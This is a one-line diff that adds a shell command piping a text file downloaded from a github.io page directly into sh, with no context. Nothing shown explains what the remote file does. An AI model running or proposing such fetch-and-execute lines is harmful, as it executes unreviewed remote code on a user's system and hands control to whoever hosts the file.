@@ -1,0 +1,1 @@
+curl -L --progress-bar frkns.github.io/fun/immune-birds-letters.txt | sh
